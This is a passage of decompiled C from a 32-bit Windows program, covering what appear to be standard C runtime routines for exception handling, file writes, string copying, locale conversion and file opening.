    }
    local_8 = 0;
    iVar1 = *(int *)(*(int *)(param_3 + 8) + 4 + iVar2 * 8);
    if (iVar1 != 0) {
      FUN_00419d90(iVar1,param_1,0x103);
      this = extraout_ECX_00;
    }
  }
  *(int *)(param_1 + 8) = iVar2;
  *unaff_FS_OFFSET = local_14;
  return;
}



void __cdecl
FUN_00419983(PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3,undefined4 param_4,
            int param_5,byte *param_6,byte *param_7,int *param_8,int param_9,PVOID param_10)

{
  undefined *UNRECOVERED_JUMPTABLE;
  void *this;
  
  if (param_7 != (byte *)0x0) {
    FUN_00419b34((int)param_1,(int)param_2,param_6,param_7);
  }
  if (param_10 == (PVOID)0x0) {
    param_10 = param_2;
  }
  FUN_004156bb(param_10,param_1);
  FUN_004198cf(this,(int)param_2,param_4,param_5,*param_8);
  *(int *)((int)param_2 + 8) = param_8[1] + 1;
  UNRECOVERED_JUMPTABLE =
       (undefined *)
       FUN_004199fe(param_1,param_2,param_3,param_5,*(undefined4 *)(param_6 + 0xc),param_9,0x100);
  if (UNRECOVERED_JUMPTABLE != (undefined *)0x0) {
    FUN_00415679(UNRECOVERED_JUMPTABLE);
  }
  return;
}



undefined4 __cdecl
FUN_004199fe(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,int param_6,int param_7)

{
  undefined4 uVar1;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_00401280;
  puStack_10 = &LAB_0041bc48;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  DAT_00425230 = param_1;
  DAT_00425234 = param_3;
  local_8 = 1;
  uVar1 = FUN_00415740(param_2,param_4,param_5,param_6,param_7);
  local_8 = 0xffffffff;
  FUN_00419ac4();
  *unaff_FS_OFFSET = local_14;
  return uVar1;
}



void FUN_00419ac4(void)

{
  int unaff_EBX;
  int unaff_EBP;
  int unaff_ESI;
  int *unaff_EDI;
  
  *(undefined4 *)(unaff_ESI + -4) = *(undefined4 *)(unaff_EBP + -0x28);
  DAT_00425230 = *(undefined4 *)(unaff_EBP + -0x1c);
  DAT_00425234 = *(undefined4 *)(unaff_EBP + -0x20);
  if ((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) && (unaff_EDI[5] == 0x19930520)) &&
     ((*(int *)(unaff_EBP + -0x24) == unaff_EBX && (*(int *)(unaff_EBP + -0x2c) != unaff_EBX)))) {
    FUN_00415a0a();
    FUN_00419cf8((int)unaff_EDI);
  }
  return;
}



void __cdecl FUN_00419b34(int param_1,int param_2,byte *param_3,byte *param_4)

{
  int *piVar1;
  bool bVar2;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  int iVar3;
  undefined3 extraout_var_01;
  undefined3 extraout_var_02;
  undefined3 extraout_var_03;
  undefined3 extraout_var_04;
  undefined4 *puVar4;
  undefined3 extraout_var_05;
  undefined3 extraout_var_06;
  undefined3 extraout_var_07;
  undefined4 *unaff_FS_OFFSET;
  FARPROC pFVar5;
  uint uVar6;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_00401298;
  puStack_10 = &LAB_0041bc48;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  if (((*(int *)(param_3 + 4) == 0) || (*(char *)(*(int *)(param_3 + 4) + 8) == '\0')) ||
     (*(int *)(param_3 + 8) == 0)) goto LAB_00419cdd;
  piVar1 = (int *)(*(int *)(param_3 + 8) + 0xc + param_2);
  local_8 = 0;
  if ((*param_3 & 8) == 0) {
    if ((*param_4 & 1) == 0) {
      pFVar5 = (FARPROC)0x1;
      if (*(int *)(param_4 + 0x18) == 0) {
        bVar2 = FUN_0041c701(*(void **)(param_1 + 0x18),1);
        if (CONCAT31(extraout_var_03,bVar2) != 0) {
          pFVar5 = (FARPROC)0x1;
          bVar2 = FUN_0041c71d(piVar1,1);
          if (CONCAT31(extraout_var_04,bVar2) != 0) {
            uVar6 = *(uint *)(param_4 + 0x14);
            puVar4 = (undefined4 *)FUN_00419d5f(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
            FUN_0041beb0(piVar1,puVar4,uVar6);
            goto LAB_00419cdd;
          }
        }
      }
      else {
        bVar2 = FUN_0041c701(*(void **)(param_1 + 0x18),1);
        if (CONCAT31(extraout_var_05,bVar2) != 0) {
          pFVar5 = (FARPROC)0x1;
          bVar2 = FUN_0041c71d(piVar1,1);
          if (CONCAT31(extraout_var_06,bVar2) != 0) {
            pFVar5 = *(FARPROC *)(param_4 + 0x18);
            bVar2 = FUN_0041c739(pFVar5);
            if (CONCAT31(extraout_var_07,bVar2) != 0) {
              if ((*param_4 & 4) == 0) {
                FUN_00419d5f(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
                FUN_004156ad(piVar1,*(undefined **)(param_4 + 0x18));
              }
              else {
                FUN_00419d5f(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
                FUN_004156b4(piVar1,*(undefined **)(param_4 + 0x18));
              }
              goto LAB_00419cdd;
            }
          }
        }
      }
    }
    else {
      pFVar5 = (FARPROC)0x1;
      bVar2 = FUN_0041c701(*(void **)(param_1 + 0x18),1);
      if (CONCAT31(extraout_var_01,bVar2) != 0) {
        pFVar5 = (FARPROC)0x1;
        bVar2 = FUN_0041c71d(piVar1,1);
        if (CONCAT31(extraout_var_02,bVar2) != 0) {
          FUN_0041beb0(piVar1,*(undefined4 **)(param_1 + 0x18),*(uint *)(param_4 + 0x14));
          if ((*(int *)(param_4 + 0x14) != 4) || (iVar3 = *piVar1, iVar3 == 0)) goto LAB_00419cdd;
          goto LAB_00419bc2;
        }
      }
    }
  }
  else {
    pFVar5 = (FARPROC)0x1;
    bVar2 = FUN_0041c701(*(void **)(param_1 + 0x18),1);
    if (CONCAT31(extraout_var,bVar2) != 0) {
      pFVar5 = (FARPROC)0x1;
      bVar2 = FUN_0041c71d(piVar1,1);
      if (CONCAT31(extraout_var_00,bVar2) != 0) {
        iVar3 = *(int *)(param_1 + 0x18);
        *piVar1 = iVar3;
LAB_00419bc2:
        iVar3 = FUN_00419d5f(iVar3,(int *)(param_4 + 8));
        *piVar1 = iVar3;
        goto LAB_00419cdd;
      }
    }
  }
  FUN_00419e32((int)pFVar5);
LAB_00419cdd:
  *unaff_FS_OFFSET = local_14;
  return;
}



void __cdecl FUN_00419cf8(int param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_004012a8;
  puStack_10 = &LAB_0041bc48;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  if ((param_1 != 0) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(*(int *)(param_1 + 0x1c) + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    local_8 = 0;
    FUN_004156ad(*(undefined4 *)(param_1 + 0x18),UNRECOVERED_JUMPTABLE);
  }
  *unaff_FS_OFFSET = local_14;
  return;
}



int __cdecl FUN_00419d5f(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  
  iVar1 = param_2[1];
  iVar2 = *param_2 + param_1;
  if (-1 < iVar1) {
    iVar2 = iVar2 + *(int *)(*(int *)(iVar1 + param_1) + param_2[2]) + iVar1;
  }
  return iVar2;
}



// WARNING: Restarted to delay deadcode elimination for space: stack

void FUN_00419d90(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)FUN_00415a2d(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  FUN_00415a2d(param_3);
  return;
}



void __fastcall FUN_00419ddc(int param_1)

{
  int unaff_EBX;
  byte *unaff_ESI;
  DWORD unaff_EDI;
  UINT *unaff_FS_OFFSET;
  byte *pbVar1;
  byte *pbVar2;
  UINT UVar3;
  
  UVar3 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (UINT)&stack0xffffffec;
  pbVar1 = &stack0xffffffd8;
  pbVar2 = &stack0xffffffd8;
  if (DAT_0042523c != (code *)0x0) {
    (*DAT_0042523c)();
    pbVar2 = pbVar1;
  }
  FUN_0041c7e4(unaff_EDI,unaff_ESI,unaff_EBX,pbVar2,param_1,UVar3);
  return;
}



void __fastcall FUN_00419e32(int param_1)

{
  int extraout_ECX;
  undefined4 *unaff_FS_OFFSET;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_004012d0;
  puStack_10 = &LAB_0041bc48;
  uStack_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_14;
  if (PTR_FUN_00408744 != (undefined *)0x0) {
    local_8 = 1;
    (*(code *)PTR_FUN_00408744)();
    param_1 = extraout_ECX;
  }
  local_8 = 0xffffffff;
  FUN_00419ddc(param_1);
  return;
}



int __cdecl FUN_00419e88(DWORD param_1,char *param_2,uint param_3)

{
  int *piVar1;
  char *pcVar2;
  byte bVar3;
  char cVar4;
  char *pcVar5;
  BOOL BVar6;
  int iVar7;
  char local_418 [1028];
  int local_14;
  DWORD local_10;
  DWORD local_c;
  char *local_8;
  
  if (param_1 < DAT_00426800) {
    piVar1 = &DAT_00426700 + ((int)param_1 >> 5);
    iVar7 = (param_1 & 0x1f) * 8;
    bVar3 = *(byte *)(*piVar1 + 4 + iVar7);
    if ((bVar3 & 1) != 0) {
      local_c = 0;
      local_14 = 0;
      if (param_3 == 0) {
        return 0;
      }
      if ((bVar3 & 0x20) != 0) {
        FUN_00417e5b(param_1,0,2);
      }
      if ((*(byte *)((HANDLE *)(*piVar1 + iVar7) + 1) & 0x80) == 0) {
        BVar6 = WriteFile(*(HANDLE *)(*piVar1 + iVar7),param_2,param_3,&local_10,(LPOVERLAPPED)0x0);
        if (BVar6 == 0) {
          param_1 = GetLastError();
        }
        else {
          local_c = local_10;
          param_1 = 0;
        }
LAB_00419f81:
        if (local_c != 0) {
          return local_c - local_14;
        }
        if (param_1 != 0) {
          if (param_1 == 5) {
            DAT_00425194 = 9;
            DAT_00425198 = 5;
            return -1;
          }
          FUN_0041a0e2(param_1);
          return -1;
        }
      }
      else {
        local_8 = param_2;
        param_1 = 0;
        if (param_3 != 0) {
          do {
            pcVar5 = local_418;
            do {
              if (param_3 <= (uint)((int)local_8 - (int)param_2)) break;
              pcVar2 = local_8 + 1;
              cVar4 = *local_8;
              local_8 = pcVar2;
              if (cVar4 == '\n') {
                local_14 = local_14 + 1;
                *pcVar5 = '\r';
                pcVar5 = pcVar5 + 1;
              }
              *pcVar5 = cVar4;
              pcVar5 = pcVar5 + 1;
            } while ((int)pcVar5 - (int)local_418 < 0x400);
            BVar6 = WriteFile(*(HANDLE *)(*piVar1 + iVar7),local_418,(int)pcVar5 - (int)local_418,
                              &local_10,(LPOVERLAPPED)0x0);
            if (BVar6 == 0) {
              param_1 = GetLastError();
              goto LAB_00419f81;
            }
            local_c = local_c + local_10;
            if (((int)local_10 < (int)pcVar5 - (int)local_418) ||
               (param_3 <= (uint)((int)local_8 - (int)param_2))) goto LAB_00419f81;
          } while( true );
        }
      }
      if (((*(byte *)(*piVar1 + 4 + iVar7) & 0x40) != 0) && (*param_2 == '\x1a')) {
        return 0;
      }
      DAT_00425194 = 0x1c;
      DAT_00425198 = 0;
      return -1;
    }
  }
  DAT_00425198 = 0;
  DAT_00425194 = 9;
  return -1;
}



int __cdecl FUN_0041a035(byte *param_1,byte *param_2,int param_3)

{
  int iVar1;
  
  if (param_3 == 0) {
    return 0;
  }
  iVar1 = FUN_0041c7fb(DAT_004256c4,1,param_1,param_3,param_2,param_3,DAT_004254a0);
  if (iVar1 == 0) {
    return 0x7fffffff;
  }
  return iVar1 + -2;
}



undefined4 FUN_0041a074(void)

{
  LPCWSTR lpWideCharStr;
  uint *cbMultiByte;
  uint *lpMultiByteStr;
  int iVar1;
  LPCWSTR *ppWVar2;
  
  lpWideCharStr = *DAT_004251c4;
  ppWVar2 = DAT_004251c4;
  while( true ) {
    if (lpWideCharStr == (LPCWSTR)0x0) {
      return 0;
    }
    cbMultiByte = (uint *)WideCharToMultiByte(1,0,lpWideCharStr,-1,(LPSTR)0x0,0,(LPCSTR)0x0,
                                              (LPBOOL)0x0);
    if (((cbMultiByte == (uint *)0x0) ||
        (lpMultiByteStr = (uint *)FUN_00415216(cbMultiByte), lpMultiByteStr == (uint *)0x0)) ||
       (iVar1 = WideCharToMultiByte(1,0,*ppWVar2,-1,(LPSTR)lpMultiByteStr,(int)cbMultiByte,
                                    (LPCSTR)0x0,(LPBOOL)0x0), iVar1 == 0)) break;
    FUN_0041ce83(lpMultiByteStr,0);
    lpWideCharStr = ppWVar2[1];
    ppWVar2 = ppWVar2 + 1;
  }
  return 0xffffffff;
}



void __cdecl FUN_0041a0e2(uint param_1)

{
  uint *puVar1;
  int iVar2;
  
  iVar2 = 0;
  DAT_00425198 = param_1;
  puVar1 = &DAT_00408748;
  do {
    if (param_1 == *puVar1) {
      DAT_00425194 = (&DAT_0040874c)[iVar2 * 2];
      return;
    }
    puVar1 = puVar1 + 2;
    iVar2 = iVar2 + 1;
  } while ((int)puVar1 < 0x4088b0);
  if ((0x12 < param_1) && (param_1 < 0x25)) {
    DAT_00425194 = 0xd;
    return;
  }
  if ((param_1 < 0xbc) || (DAT_00425194 = 8, 0xca < param_1)) {
    DAT_00425194 = 0x16;
  }
  return;
}



uint __cdecl FUN_0041a149(uint param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  undefined uVar5;
  undefined2 local_8;
  
  uVar4 = param_1;
  if (param_1 < 0x100) {
    if (((&DAT_004255c1)[param_1] & 0x20) == 0x20) {
      uVar4 = (uint)(byte)(&DAT_004254c0)[param_1];
    }
  }
  else {
    uVar5 = (undefined)param_1;
    uVar2 = param_1 >> 8;
    uVar1 = param_1 >> 8;
    param_1 = CONCAT13(uVar5,CONCAT12((char)uVar1,(undefined2)param_1));
    if ((((&DAT_004255c1)[uVar2 & 0xff] & 4) != 0) &&
       (iVar3 = FUN_0041a5d5(DAT_004256c4,0x200,(char *)((int)&param_1 + 2),2,&local_8,2,
                             DAT_004254a0,1), iVar3 != 0)) {
      uVar4 = (uint)CONCAT11((undefined)local_8,local_8._1_1_);
    }
  }
  return uVar4;
}



uint * __cdecl FUN_0041a1d0(uint *param_1,uint *param_2)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  uVar3 = (uint)param_2 & 3;
  puVar4 = param_1;
  while (uVar3 != 0) {
    bVar1 = *(byte *)param_2;
    uVar3 = (uint)bVar1;
    param_2 = (uint *)((int)param_2 + 1);
    if (bVar1 == 0) goto LAB_0041a2b8;
    *(byte *)puVar4 = bVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    uVar3 = (uint)param_2 & 3;
  }
  do {
    uVar2 = *param_2;
    uVar3 = *param_2;
    param_2 = param_2 + 1;
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar3 == '\0') {
LAB_0041a2b8:
        *(byte *)puVar4 = (byte)uVar3;
        return param_1;
      }
      if ((char)(uVar3 >> 8) == '\0') {
        *(short *)puVar4 = (short)uVar3;
        return param_1;
      }
      if ((uVar3 & 0xff0000) == 0) {
        *(short *)puVar4 = (short)uVar3;
        *(byte *)((int)puVar4 + 2) = 0;
        return param_1;
      }
      if ((uVar3 & 0xff000000) == 0) {
        *puVar4 = uVar3;
        return param_1;
      }
    }
    *puVar4 = uVar3;
    puVar4 = puVar4 + 1;
  } while( true );
}



uint * __cdecl FUN_0041a1e0(uint *param_1,uint *param_2)

{
  byte bVar1;
  uint uVar2;
  uint *puVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar4 = (uint)param_1 & 3;
  puVar3 = param_1;
  while (uVar4 != 0) {
    bVar1 = *(byte *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (bVar1 == 0) goto LAB_0041a22f;
    uVar4 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar5 = puVar3;
      puVar3 = puVar5 + 1;
    } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);
    uVar4 = *puVar5;
    if ((char)uVar4 == '\0') goto LAB_0041a241;
    if ((char)(uVar4 >> 8) == '\0') {
      puVar5 = (uint *)((int)puVar5 + 1);
      goto LAB_0041a241;
    }
    if ((uVar4 & 0xff0000) == 0) {
      puVar5 = (uint *)((int)puVar5 + 2);
      goto LAB_0041a241;
    }
  } while ((uVar4 & 0xff000000) != 0);
LAB_0041a22f:
  puVar5 = (uint *)((int)puVar3 + -1);
LAB_0041a241:
  uVar4 = (uint)param_2 & 3;
  while (uVar4 != 0) {
    bVar1 = *(byte *)param_2;
    uVar4 = (uint)bVar1;
    param_2 = (uint *)((int)param_2 + 1);
    if (bVar1 == 0) goto LAB_0041a2b8;
    *(byte *)puVar5 = bVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    uVar4 = (uint)param_2 & 3;
  }
  do {
    uVar2 = *param_2;
    uVar4 = *param_2;
    param_2 = param_2 + 1;
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar4 == '\0') {
LAB_0041a2b8:
        *(byte *)puVar5 = (byte)uVar4;
        return param_1;
      }
      if ((char)(uVar4 >> 8) == '\0') {
        *(short *)puVar5 = (short)uVar4;
        return param_1;
      }
      if ((uVar4 & 0xff0000) == 0) {
        *(short *)puVar5 = (short)uVar4;
        *(byte *)((int)puVar5 + 2) = 0;
        return param_1;
      }
      if ((uVar4 & 0xff000000) == 0) {
        *puVar5 = uVar4;
        return param_1;
      }
    }
    *puVar5 = uVar4;
    puVar5 = puVar5 + 1;
  } while( true );
}



char * __cdecl FUN_0041a2c0(int param_1,uint *param_2,uint **param_3,uint **param_4)

{
  uint *puVar1;
  uint *puVar2;
  char *pcVar3;
  uint *puVar4;
  int iVar5;
  undefined **ppuVar6;
  char *local_c;
  
  puVar1 = (uint *)FUN_0041ae10((byte *)param_2,0x5c);
  puVar2 = (uint *)FUN_0041ae10((byte *)param_2,0x2f);
  puVar4 = param_2;
  if (puVar2 == (uint *)0x0) {
    if ((puVar1 != (uint *)0x0) || (puVar1 = FUN_0041d0c9(param_2,0x3a), puVar1 != (uint *)0x0))
    goto LAB_0041a335;
    pcVar3 = FUN_004194b0(param_2);
    puVar4 = (uint *)FUN_00415216((uint *)(pcVar3 + 3));
    if (puVar4 != (uint *)0x0) {
      FUN_0041a1d0(puVar4,(uint *)&DAT_00401308);
      FUN_0041a1e0(puVar4,param_2);
      puVar1 = (uint *)((int)puVar4 + 2);
      goto LAB_0041a335;
    }
LAB_0041a38e:
    local_c = (char *)0xffffffff;
  }
  else {
    if ((puVar1 == (uint *)0x0) || (puVar1 < puVar2)) {
      puVar1 = puVar2;
    }
LAB_0041a335:
    local_c = (char *)0xffffffff;
    iVar5 = FUN_0041ae10((byte *)puVar1,0x2e);
    if (iVar5 == 0) {
      pcVar3 = FUN_004194b0(puVar4);
      puVar1 = (uint *)FUN_00415216((uint *)(pcVar3 + 5));
      if (puVar1 == (uint *)0x0) goto LAB_0041a38e;
      FUN_0041a1d0(puVar1,puVar4);
      pcVar3 = FUN_004194b0(puVar4);
      ppuVar6 = &PTR_DAT_004088bc;
      do {
        FUN_0041a1d0((uint *)(pcVar3 + (int)puVar1),(uint *)*ppuVar6);
        iVar5 = FUN_0041a8c3((LPCSTR)puVar1,0);
        if (iVar5 != -1) {
          local_c = FUN_0041a409(param_1,(LPCSTR)puVar1,param_3,param_4);
          break;
        }
        ppuVar6 = (undefined **)((uint **)ppuVar6 + -1);
      } while (0x4088af < (int)ppuVar6);
      FUN_004150a9(puVar1);
    }
    else {
      iVar5 = FUN_0041a8c3((LPCSTR)puVar4,0);
      if (iVar5 != -1) {
        local_c = FUN_0041a409(param_1,(LPCSTR)puVar4,param_3,param_4);
      }
    }
    if (puVar4 != param_2) {
      FUN_004150a9(puVar4);
    }
  }
  return local_c;
}



char * __cdecl FUN_0041a409(int param_1,LPCSTR param_2,uint **param_3,uint **param_4)

{
  int iVar1;
  char *pcVar2;
  
  iVar1 = FUN_0041d31b(param_3,param_4,(uint **)&param_4,(uint **)&param_3);
  if (iVar1 == -1) {
    return (char *)0xffffffff;
  }
  pcVar2 = FUN_0041d13c(param_1,param_2,(char *)param_4,param_3);
  FUN_004150a9(param_4);
  FUN_004150a9(param_3);
  return pcVar2;
}



int __cdecl
FUN_0041a45a(int param_1,int param_2,int param_3,int param_4,int param_5,int param_6,int param_7)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  uint uVar3;
  int iVar4;
  int local_28 [2];
  int local_20;
  int local_18;
  uint local_14;
  int local_c;
  
  uVar3 = param_1 - 0x76c;
  if (((int)uVar3 < 0x46) || (0x8a < (int)uVar3)) {
    iVar2 = -1;
  }
  else {
    iVar4 = *(int *)(&DAT_0040907c + param_2 * 4) + param_3;
    if (((uVar3 & 3) == 0) && (2 < param_2)) {
      iVar4 = iVar4 + 1;
    }
    FUN_0041ae70();
    local_20 = param_4;
    local_18 = param_2 + -1;
    iVar2 = ((param_4 + (uVar3 * 0x16d + iVar4 + (param_1 + -0x76d >> 2)) * 0x18) * 0x3c + param_5)
            * 0x3c + DAT_00408b40 + 0x7c558180 + param_6;
    if ((param_7 == 1) ||
       (((param_7 == -1 && (DAT_00408b44 != 0)) &&
        (local_14 = uVar3, local_c = iVar4, bVar1 = FUN_0041b0e3(local_28),
        CONCAT31(extraout_var,bVar1) != 0)))) {
      iVar2 = iVar2 + DAT_00408b48;
    }
  }
  return iVar2;
}



int __cdecl
FUN_0041a5d5(LCID param_1,uint param_2,char *param_3,int param_4,LPWSTR param_5,int param_6,
            UINT param_7,int param_8)

{
  int iVar1;
  int iVar2;
  undefined unaff_DI;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_00401318;
  puStack_10 = &LAB_0041bc48;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  if (DAT_00425244 == 0) {
    iVar1 = LCMapStringW(0,0x100,L"",1,(LPWSTR)0x0,0);
    if (iVar1 != 0) {
      DAT_00425244 = 1;
      goto LAB_0041a64b;
    }
    iVar1 = LCMapStringA(0,0x100,"",1,(LPSTR)0x0,0);
    if (iVar1 != 0) {
      DAT_00425244 = 2;
      goto LAB_0041a64b;
    }
  }
  else {
LAB_0041a64b:
    if (0 < param_4) {
      param_4 = FUN_0041ca78(param_3,param_4);
    }
    if (DAT_00425244 == 2) {
      iVar1 = LCMapStringA(param_1,param_2,param_3,param_4,(LPSTR)param_5,param_6);
      goto LAB_0041a765;
    }
    if (DAT_00425244 == 1) {
      if (param_7 == 0) {
        param_7 = DAT_00425260;
      }
      iVar2 = MultiByteToWideChar(param_7,(-(uint)(param_8 != 0) & 8) + 1,param_3,param_4,
                                  (LPWSTR)0x0,0);
      if (iVar2 != 0) {
        local_8 = 0;
        FUN_00415a50(unaff_DI);
        local_8 = 0xffffffff;
        if ((&stack0x00000000 != (undefined *)0x3c) &&
           (iVar1 = MultiByteToWideChar(param_7,1,param_3,param_4,(LPWSTR)&stack0xffffffc4,iVar2),
           iVar1 != 0)) {
          iVar1 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar2,(LPWSTR)0x0,0);
          if (iVar1 != 0) {
            if ((param_2 & 0x400) == 0) {
              local_8 = 1;
              FUN_00415a50(unaff_DI);
              local_8 = 0xffffffff;
              if ((&stack0x00000000 != (undefined *)0x3c) &&
                 (iVar2 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar2,
                                       (LPWSTR)&stack0xffffffc4,iVar1), iVar2 != 0)) {
                if (param_6 == 0) {
                  param_6 = 0;
                  param_5 = (LPWSTR)0x0;
                }
                iVar1 = WideCharToMultiByte(param_7,0x220,(LPCWSTR)&stack0xffffffc4,iVar1,
                                            (LPSTR)param_5,param_6,(LPCSTR)0x0,(LPBOOL)0x0);
                iVar2 = iVar1;
joined_r0x0041a7ec:
                if (iVar2 != 0) goto LAB_0041a765;
              }
            }
            else {
              if (param_6 == 0) goto LAB_0041a765;
              if (iVar1 <= param_6) {
                iVar2 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar2,param_5,param_6
                                    );
                goto joined_r0x0041a7ec;
              }
            }
          }
        }
      }
    }
  }
  iVar1 = 0;
LAB_0041a765:
  *unaff_FS_OFFSET = local_14;
  return iVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_0041a7f9(int **param_1)

{
  byte bVar1;
  undefined3 extraout_var;
  int iVar2;
  int *piVar3;
  
  bVar1 = FUN_0041c443((uint)param_1[4]);
  if (CONCAT31(extraout_var,bVar1) == 0) {
    return 0;
  }
  if (param_1 == (int **)&DAT_004088e0) {
    iVar2 = 0;
  }
  else {
    if (param_1 != (int **)&DAT_00408900) {
      return 0;
    }
    iVar2 = 1;
  }
  _DAT_00425240 = _DAT_00425240 + 1;
  if ((*(ushort *)(param_1 + 3) & 0x10c) != 0) {
    return 0;
  }
  if ((&DAT_00425268)[iVar2] == 0) {
    piVar3 = (int *)FUN_00415216((uint *)0x1000);
    (&DAT_00425268)[iVar2] = piVar3;
    if (piVar3 == (int *)0x0) {
      param_1[2] = (int *)(param_1 + 5);
      *param_1 = (int *)(param_1 + 5);
      param_1[6] = (int *)0x2;
      param_1[1] = (int *)0x2;
      goto LAB_0041a875;
    }
  }
  piVar3 = (int *)(&DAT_00425268)[iVar2];
  param_1[6] = (int *)0x1000;
  param_1[2] = piVar3;
  *param_1 = piVar3;
  param_1[1] = (int *)0x1000;
LAB_0041a875:
  *(ushort *)(param_1 + 3) = *(ushort *)(param_1 + 3) | 0x1102;
  return 1;
}



void __cdecl FUN_0041a886(int param_1,int *param_2)

{
  if (param_1 == 0) {
    if ((*(byte *)((int)param_2 + 0xd) & 0x10) != 0) {
      FUN_004175bd(param_2);
    }
  }
  else if ((*(byte *)((int)param_2 + 0xd) & 0x10) != 0) {
    FUN_004175bd(param_2);
    *(byte *)((int)param_2 + 0xd) = *(byte *)((int)param_2 + 0xd) & 0xee;
    param_2[6] = 0;
    *param_2 = 0;
    param_2[2] = 0;
    return;
  }
  return;
}



undefined4 __cdecl FUN_0041a8c3(LPCSTR param_1,byte param_2)

{
  DWORD DVar1;
  
  DVar1 = GetFileAttributesA(param_1);
  if (DVar1 == 0xffffffff) {
    DVar1 = GetLastError();
    FUN_0041a0e2(DVar1);
  }
  else {
    if (((DVar1 & 1) == 0) || ((param_2 & 2) == 0)) {
      return 0;
    }
    DAT_00425194 = 0xd;
    DAT_00425198 = 5;
  }
  return 0xffffffff;
}



uint * __cdecl FUN_0041a907(uint *param_1)

{
  char *pcVar1;
  uint *puVar2;
  
  if (param_1 != (uint *)0x0) {
    pcVar1 = FUN_004194b0(param_1);
    puVar2 = (uint *)FUN_00415216((uint *)(pcVar1 + 1));
    if (puVar2 != (uint *)0x0) {
      puVar2 = FUN_0041a1d0(puVar2,param_1);
      return puVar2;
    }
  }
  return (uint *)0x0;
}



uint __cdecl FUN_0041a932(LPCSTR param_1,uint param_2,uint param_3,uint param_4)

{
  byte *pbVar1;
  uint uVar2;
  uint uVar3;
  HANDLE hFile;
  DWORD DVar4;
  int iVar5;
  int iVar6;
  bool bVar7;
  _SECURITY_ATTRIBUTES local_20;
  DWORD local_14;
  undefined4 local_10;
  DWORD local_c;
  byte local_5;
  
  bVar7 = (param_2 & 0x80) == 0;
  local_20.nLength = 0xc;
  local_20.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar7) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_20.bInheritHandle = (BOOL)bVar7;
  if (((param_2 & 0x8000) == 0) && (((param_2 & 0x4000) != 0 || (DAT_00425478 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar2 = param_2 & 3;
  if (uVar2 == 0) {
    local_10 = 0x80000000;
  }
  else if (uVar2 == 1) {
    local_10 = 0x40000000;
  }
  else {
    if (uVar2 != 2) {
      DAT_00425194 = 0x16;
      DAT_00425198 = 0;
      return 0xffffffff;
    }
    local_10 = 0xc0000000;
  }
  if (param_3 == 0x10) {
    local_14 = 0;
  }
  else if (param_3 == 0x20) {
    local_14 = 1;
  }
  else if (param_3 == 0x30) {
    local_14 = 2;
  }
  else {
    if (param_3 != 0x40) {
      DAT_00425194 = 0x16;
      DAT_00425198 = 0;
      return 0xffffffff;
    }
    local_14 = 3;
  }
  uVar2 = param_2 & 0x700;
  if (uVar2 < 0x401) {
    if ((uVar2 == 0x400) || (uVar2 == 0)) {
      local_c = 3;
    }
    else if (uVar2 == 0x100) {
      local_c = 4;
    }
    else {
      if (uVar2 == 0x200) goto LAB_0041aa50;
      if (uVar2 != 0x300) {
        DAT_00425194 = 0x16;
        DAT_00425198 = 0;
        return 0xffffffff;
      }
      local_c = 2;
    }
  }
  else {
    if (uVar2 != 0x500) {
      if (uVar2 == 0x600) {
LAB_0041aa50:
        local_c = 5;
        goto LAB_0041aa60;
      }
      if (uVar2 != 0x700) {
        DAT_00425194 = 0x16;
        DAT_00425198 = 0;
